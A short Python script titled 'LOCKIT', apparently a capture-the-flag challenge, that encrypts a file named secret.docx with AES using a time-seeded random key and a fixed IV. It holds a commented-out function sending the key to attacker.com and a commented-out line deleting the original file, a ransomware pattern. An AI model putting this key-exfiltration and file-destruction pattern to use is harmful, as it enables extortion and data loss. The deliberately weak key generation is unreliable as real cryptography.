#!/usr/bin/python
#encoding=utf-8
'''
  _    _     ___   ____ _  _____ _____    _  
 | |  | |   / _ \ / ___| |/ /_ _|_   _|  | | 
/ __) | |  | | | | |   | ' / | |  | |   / __)
\__ \ | |__| |_| | |___| . \ | |  | |   \__ \
(   / |_____\___/ \____|_|\_\___| |_|   (   /
 |_|                                     |_| 

'''

from Crypto.Cipher import AES
import random
import time
import os

plaintext_file = "secret.docx"
encrypted_file = "secret.docx.enc"
IV = "\x42" * AES.block_size

#def send_key(key):
#    '''
#    Send the encryption key to our server.
#    '''
#    import requests
#    requests.get("https://attacker.com", params = {"file" : plaintext_file, "key" : key})

def generate_key(size):
    key = bytearray()
    random.seed(int(time.time()))
    for _ in range(size):
        key.append(random.randint(0, 255))
    return str(key)

def pad(text):
    return text + (AES.block_size - len(text) % AES.block_size) * "\xff"

def encrypt(plaintext, cipher):
    return cipher.encrypt(pad(plaintext)).encode('hex')

def main():
    with open(plaintext_file, 'r') as f:
        plaintext = f.read()
    key = generate_key(32)
    # send_key(key.encode('hex'))
    cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
    ciphertext = encrypt(plaintext, cipher)
    with open(encrypted_file, 'w') as f:
        f.write(ciphertext)
    # 😈
    # os.remove(plaintext_file)

if __name__ == "__main__":
    main()

